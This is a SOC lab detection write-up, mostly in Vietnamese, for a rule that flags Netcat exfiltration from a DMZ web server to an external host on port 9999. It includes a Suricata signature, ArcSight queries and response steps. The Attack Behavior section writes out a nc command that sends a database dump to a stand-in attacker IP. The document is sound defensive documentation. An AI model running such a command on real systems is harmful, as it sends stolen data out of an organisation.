# A13 — Suspicious DMZ External Transfer

## 1. Detection ID
A13

## 2. Detection Name
Suspicious DMZ External Transfer (Data Exfiltration via Netcat)

## 3. Detection Objective
Phát hiện hành vi tuồn dữ liệu bất thường (Data Exfiltration) từ máy chủ dịch vụ trong phân vùng DMZ (`WEB01`) ra máy chủ bên ngoài Internet (`Kali`) qua cổng dịch vụ không tiêu chuẩn (`TCP/9999`) dựa trên chữ ký Suricata IPS trên tuyến Security Transit.

## 4. Security Context
Nằm ở giai đoạn **Exfiltration (Giai đoạn 9 - Đánh cắp và chuyển dữ liệu ra ngoài)** trong Cyber Kill Chain / kỹ thuật MITRE ATT&CK `T1048.003` (Exfiltration Over Alternative Protocol - Unencrypted Non-Standard Port) và `T1041` (Exfiltration Over C2 Channel).

## 5. Attack Behavior
Sau khi kết xuất thành công tệp cơ sở dữ liệu nhân sự nén `/tmp/_6f9beb897020ebe5.sql.gz` ở giai đoạn trước, kẻ tấn công trên `WEB01` (`10.10.34.13`) sử dụng tiện ích Netcat để đẩy toàn bộ tệp này ra máy chủ điều khiển bên ngoài Internet (`203.0.113.25`) đang mở cổng tiếp nhận `9999`:
```bash
nc 203.0.113.25 9999 < /tmp/_6f9beb897020ebe5.sql.gz
```
Luồng truyền dữ liệu thô này đi xuyên qua Security Transit và bị bộ cảm biến Suricata IPS giám sát.

## 6. Telemetry Source
* **Hệ thống phát sinh**: `SURICATA-IPS01` trên tuyến Security Transit (`10.10.36.0/24`).
* **Cơ chế thu thập**: Chữ ký Suricata tùy biến (Custom Signature SID `1101021`):
  ```text
  alert tcp $DMZ_NET any -> $EXTERNAL_NET 9999 (msg:"SOCLAB SUSPICIOUS DMZ Netcat Outbound Transfer to Port 9999"; flow:to_server,established; classtype:policy-violation; sid:1101021; rev:1;)
  ```
* **Định dạng gốc**: Suricata EVE JSON (`event_type: alert`).
* **Giao thức truyền**: Syslog TCP cổng `5521` (Generator ID 2002) chuyển tiếp tới ArcSight.

## 7. Observable Evidence
* `deviceProduct = "Suricata IDS IPS"`.
* `deviceCustomNumber1 = 1101021` (Suricata SID).
* `sourceAddress = 10.10.34.13` (WEB01 DMZ).
* `destinationAddress = 203.0.113.25` (External Kali).
* `destinationPort = 9999`.
* `deviceAction = "allowed"` (hoặc `alert`).

## 8. Required Fields
* `deviceProduct`: Bằng `"Suricata IDS IPS"`.
* `deviceCustomNumber1`: Bằng `1101021`.
* `sourceAddress`: Bằng `10.10.34.13`.
* `destinationAddress`: Bằng `203.0.113.25`.

## 9. Detection Logic
Cảnh báo kích hoạt khi Suricata phát hiện sự kiện khớp chữ ký SID `1101021` chỉ ra luồng kết nối TCP outbound từ máy chủ Web DMZ ra máy chủ bên ngoài qua cổng 9999.

## 10. Logger Validation Query
```text
deviceProduct="Suricata IDS IPS" AND deviceCustomNumber1=1101021 AND sourceAddress=10.10.34.13 AND destinationAddress=203.0.113.25
```

## 11. ESM Logic
```text
(Device Product = Suricata IDS IPS) AND 
(Device Custom Number 1 = 1101021) AND 
(Source Address = 10.10.34.13) AND 
(Target Address = 203.0.113.25)
```

## 12. Threshold / Time Window
Not applicable (Kích hoạt theo từng sự kiện cảnh báo đơn lẻ - Single Event).

## 13. Expected Alert
Cảnh báo mức độ Tối khẩn cấp (Severity 9-10 / Critical) xuất hiện trên ArcSight ESM:
* Tên hiển thị: `SOC-LAB A13 Suspicious DMZ External Transfer`
* Nguồn: `10.10.34.13` $\rightarrow$ Đích: `203.0.113.25:9999`
* Mức độ nghiêm trọng: Data Exfiltration in Progress.

## 14. Validation Status
**OBSERVED FIRING — EXFILTRATION** (Đã cấu hình trên ESM, xác thực trên Logger ghi nhận 2 sự kiện Suricata alert và kích hoạt thành công khi kẻ tấn công truyền file).

## 15. False Positives / Benign Cases
Gần như bằng không (Zero False Positives) trong môi trường phân vùng chuẩn. Máy chủ dịch vụ Web DMZ không bao giờ được phép khởi tạo kết nối outbound tự do ra Internet trên các cổng không xác định như 9999.

## 16. Investigation Pivot
Khi Rule A13 kích hoạt:
1. Xác định khối lượng dữ liệu đã truyền (bytes sent/received) bằng cách kiểm tra log phiên Zeek hoặc Suricata flow log để xác định dung lượng file rò rỉ.
2. Kiểm tra tiến trình trên `WEB01` xem công cụ nào đang duy trì kết nối tới IP đích (`nc`, `curl`, `socat`).
3. Khẩn cấp thực hiện biện pháp ngăn chặn (Containment): Cắt đứt kết nối mạng của `WEB01` hoặc chặn IP đích `203.0.113.25` trên Firewall/Transit.
4. Tổng hợp toàn bộ chuỗi chứng cứ từ `A01` đến `A13` để xây dựng báo cáo phân tích sự cố toàn diện.

## 17. Related Detection
* Trước đó: **A12** (Kết xuất cơ sở dữ liệu trên máy chủ DB).
* Khép lại chuỗi hành động xâm nhập và trích xuất dữ liệu của kẻ tấn công trong kịch bản thực nghiệm.

## 18. Limitations
Rule này phụ thuộc trực tiếp vào chữ ký Suricata giám sát cổng đích cố định (`TCP/9999`). Nếu kẻ tấn công chuyển hướng tuồn dữ liệu qua các kênh mã hóa hợp lệ như HTTPS cổng `443` hoặc đóng gói qua DNS Tunneling, chữ ký này sẽ không phát hiện được. Để khắc phục triệt để, kiến trúc cần áp dụng chính sách Egress Filtering nghiêm ngặt trên Firewall (chặn hoàn toàn outbound từ DMZ trừ các cổng/IP được whitelist) và phân tích bất thường dung lượng mạng (Network Anomaly Detection).

## 19. Public-Safe Representation
* Nguồn: `10.10.34.13` (WEB01 DMZ).
* Đích: `203.0.113.25` (External Kali).
* Cổng đích: `9999`.

## 20. Source References
* **Tài liệu nguồn**: `Báo cáo đề tài SOC.pdf`, Trang 78, 105, 106, 110, 124.
* **Tài liệu kiến trúc**: `toan-bo-he-thong-kien_truc_lab.txt`, Mục 54.
* **Bằng chứng thực nghiệm**: Màn hình cấu hình Rule A13 trong ESM và kết quả Logger query hiển thị 2 events Suricata IPS SID 1101021 (Trang 106, 124).
